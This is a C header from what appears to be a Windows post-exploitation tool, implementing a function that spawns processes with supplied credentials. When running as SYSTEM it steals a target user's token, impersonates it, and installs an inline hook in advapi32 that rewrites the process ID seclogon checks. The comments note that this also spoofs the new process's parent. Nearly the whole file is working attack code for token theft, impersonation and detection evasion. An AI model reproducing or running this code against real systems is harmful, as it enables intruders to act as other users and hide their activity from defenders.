#ifndef SPAWN_H
#define SPAWN_H

#include <windows.h>
#include "token.h"
#include "hook.h"

// -----------------------------------------------------------------------------
// SpawnWithCreds
//
// Non-SYSTEM path : direct CreateProcessWithLogonW (goes through seclogon)
//
// SYSTEM path     : steal -t user token -> impersonate -> hook -> CPWLW
//
//   Root cause of SYSTEM failure:
//     advapi32 reads GetCurrentProcessId() to fill SECL_REQUEST.dwProcessId.
//     seclogon calls OpenProcess(0x4C0, FALSE, dwProcessId) while impersonating
//     the caller. A medium-integrity token cannot open a SYSTEM-owned process
//     with PROCESS_CREATE_PROCESS|PROCESS_DUP_HANDLE|PROCESS_QUERY_INFORMATION
//     -> ERROR_ACCESS_DENIED (5).
//
//   Fix:
//     Inline hook on c_SeclCreateProcessWithLogonW call site inside CommonW.
//     Stub patches SECL_REQUEST.dwProcessId to a user-owned process PID before
//     the RPC fires. seclogon opens that process successfully -> spawn works.
//     PPID spoofing comes for free as a side effect.
//
// Args:
//   domain      : target domain for -u credential
//   user        : target username for -u credential
//   password    : password for -u credential
//   cmdline     : command to spawn
//   stealTarget : username of process to steal token from for impersonation (-t)
//   ppidName    : preferred parent process name for PPID spoof (NULL = use stolen PID)
//   sleepMs     : sleep before CPWLW call (debugger attach window, 0 = no sleep)
// -----------------------------------------------------------------------------
static BOOL SpawnWithCreds(LPCSTR domain, LPCSTR user,
                           LPCSTR password, LPCSTR cmdline,
                           LPCSTR stealTarget, LPCSTR ppidName,
                           DWORD sleepMs) {

    // DBG_SEPARATOR();
    // DBG_INFO("SpawnWithCreds -> %s\\%s  cmd: %s", domain, user, cmdline);
    // DBG_SEPARATOR();

    PROCESS_INFORMATION pi = {0};
    BOOL result = FALSE;

    // -------------------------------------------------------------------------
    // not SYSTEM -> direct CreateProcessWithLogonW
    // -------------------------------------------------------------------------
    if (!_IsSystem()) {
        DBG_INFO("non-SYSTEM -> CreateProcessWithLogonW");
        // DBG_SEPARATOR();

        // HANDLE hSelf = NULL;
        // if (OpenProcessToken(GetCurrentProcess(),
        //                      TOKEN_QUERY|TOKEN_QUERY_SOURCE, &hSelf)) {
        //     DumpTokenInfo(hSelf, "[1] caller token");
        //     CloseHandle(hSelf);
        // }

        WCHAR wUser[256]={0}, wDomain[256]={0}, wPass[256]={0}, wCmd[512]={0};
        MultiByteToWideChar(CP_ACP,0,user,    -1,wUser,  256);
        MultiByteToWideChar(CP_ACP,0,domain,  -1,wDomain,256);
        MultiByteToWideChar(CP_ACP,0,password,-1,wPass,  256);
        MultiByteToWideChar(CP_ACP,0,cmdline, -1,wCmd,   512);

        STARTUPINFOW si = {0};
        si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;

        DBG_INFO("Calling CreateProcessWithLogonW...");
        result = CreateProcessWithLogonW(wUser, wDomain, wPass,
                     LOGON_WITH_PROFILE, NULL, wCmd,
                     CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
        if (!result) {
            DBG_ERR("CreateProcessWithLogonW failed: 0x%08lX", GetLastError());
            return FALSE;
        }
        DBG_OK("process spawned PID %lu", pi.dwProcessId);
        WaitForSingleObject(pi.hProcess, 500);
        // token info no need for it just extensive debug
        // HANDLE hChild = NULL;
        // if (OpenProcessToken(pi.hProcess, TOKEN_QUERY|TOKEN_QUERY_SOURCE, &hChild)) {
        //     DumpTokenInfo(hChild, "spawned token (seclogon)");
        //     CloseHandle(hChild);
        // }
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return TRUE;
    }

    // -------------------------------------------------------------------------
    // SYSTEM -> steal token -> impersonate -> hook -> CPWLW
    // -------------------------------------------------------------------------
    DBG_INFO("SYSTEM -> steal token -> impersonate -> hook -> CreateProcessWithLogonW");
    // DBG_SEPARATOR();

    if (!stealTarget || !stealTarget[0]) {
        DBG_ERR("requires -t <target_user>");
        return FALSE;
    }

    // dump SYSTEM token
    // HANDLE hSelf = NULL;
    // if (OpenProcessToken(GetCurrentProcess(),
    //                      TOKEN_QUERY|TOKEN_QUERY_SOURCE, &hSelf)) {
    //     DumpTokenInfo(hSelf, "SYSTEM token (before downgrade)");
    //      CloseHandle(hSelf);
    // }
    //
    // steal token from -t target
    // stolenPid is guaranteed user-owned -> used as fallback spoofPid
    DBG_INFO("stealing token from %s...", stealTarget);
    target t = { .username = stealTarget, .pid = 0 };
    DWORD  stolenPid = 0;
    HANDLE hStolen   = StealToken(&t, &stolenPid);
    if (!hStolen) { DBG_ERR("StealToken failed"); return FALSE; }
    DBG_OK("stolen from PID %lu", stolenPid);
    // token info
    // DumpTokenInfo(hStolen, "stolen token from -t target");

    // duplicate to impersonation token
    HANDLE hImp = NULL;
    if (!DuplicateTokenEx(hStolen, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenImpersonation, &hImp)) {
        DBG_ERR("DuplicateTokenEx failed: 0x%08lX", GetLastError());
        CloseHandle(hStolen); return FALSE;
    }
    CloseHandle(hStolen);
    // DumpTokenInfo(hImp, "Duplicated impersonation token");

    // impersonate -> thread runs as stealTarget, process still SYSTEM
    if (!ImpersonateLoggedOnUser(hImp)) {
        DBG_ERR("ImpersonateLoggedOnUser failed: 0x%08lX", GetLastError());
        CloseHandle(hImp); return FALSE;
    }
    DBG_OK("Impersonating %s", stealTarget);

    // HANDLE hThrTok = NULL;
    // if (OpenThreadToken(GetCurrentThread(),
    //                     TOKEN_QUERY|TOKEN_QUERY_SOURCE, FALSE, &hThrTok)) {
    //     DumpTokenInfo(hThrTok, "Thread token (proves downgrade)");
    //     CloseHandle(hThrTok);
    // }

    // find spoofPid
    // priority: --ppid filter -> fallback to stolenPid
    DBG_INFO("Finding spoofPid...");
    DWORD spoofPid = 0;
    if (ppidName && ppidName[0]) {
        DBG_INFO("Preferred parent: %s owned by %s", ppidName, stealTarget);
        spoofPid = FindProcessByUser(stealTarget, ppidName);
        if (!spoofPid) {
            DBG_WARN("%s not found for %s -> fallback stolenPid %lu", ppidName, stealTarget, stolenPid);
            spoofPid = stolenPid;
        }
    } else {
        DBG_INFO("no --ppid -> using stolenPid %lu", stolenPid);
        spoofPid = stolenPid;
    }

    if (!spoofPid) {
        DBG_ERR("SpoofPid is 0");
        RevertToSelf(); CloseHandle(hImp); return FALSE;
    }
    DBG_OK("SpoofPid = %lu (0x%lX)", spoofPid, spoofPid);

    // install hook on c_SeclCreateProcessWithLogonW call site
    // stub patches SECL_REQUEST.dwProcessId at [rcx+0xD8] = spoofPid
    DBG_INFO("Installing hook...");
    BOOL hookOk = HookInstall(spoofPid);
    if (!hookOk)
        DBG_WARN("HookInstall failed -> expect 0x5");
    // else
    //     DBG_OK("hook installed");

    // optional sleep for debugger attach
    if (sleepMs > 0) {
        DBG_WARN(">>> SLEEPING %lums -> PID=%lu <<<", sleepMs, GetCurrentProcessId());
        DBG_WARN(">>> bp ADVAPI32!CreateProcessWithLogonCommonW+768 <<<");
        Sleep(sleepMs);
        DBG_INFO(">>> sleep done, calling now <<<");
    }

    // wide string setup
    WCHAR wUser[256]={0}, wDomain[256]={0}, wPass[256]={0}, wCmd[512]={0};
    MultiByteToWideChar(CP_ACP,0,user,    -1,wUser,  256);
    MultiByteToWideChar(CP_ACP,0,domain,  -1,wDomain,256);
    MultiByteToWideChar(CP_ACP,0,password,-1,wPass,  256);
    MultiByteToWideChar(CP_ACP,0,cmdline, -1,wCmd,   512);

    STARTUPINFOW si = {0};
    si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    // fire CPWLW -> hook stub patches dwProcessId inside here
    DBG_INFO("Calling CreateProcessWithLogonW...");
    result = CreateProcessWithLogonW(wUser, wDomain, wPass,
                 LOGON_WITH_PROFILE, NULL, wCmd,
                 CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    DWORD lastErr = GetLastError();

    // remove hook immediately
    if (hookOk) { HookRemove();}

    // revert to SYSTEM
    RevertToSelf();
    DBG_INFO("RevertToSelf -> back to SYSTEM");
    CloseHandle(hImp);

    if (!result) {
        DBG_ERR("CreateProcessWithLogonW failed: 0x%08lX", lastErr);
        return FALSE;
    }
    DBG_OK("Process spawned PID %lu (spoofed parent=%lu)", pi.dwProcessId, spoofPid);

    // dump child token
    // WaitForSingleObject(pi.hProcess, 500);
    // HANDLE hChild = NULL;
    // if (OpenProcessToken(pi.hProcess, TOKEN_QUERY|TOKEN_QUERY_SOURCE, &hChild)) {
    //     DumpTokenInfo(hChild, "Spawned process token");
    //     CloseHandle(hChild);
    // } else {
    //     DBG_WARN("Could not open child token: 0x%08lX", GetLastError());
    // }
    //
    // WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return TRUE;
}

#endif // SPAWN_H
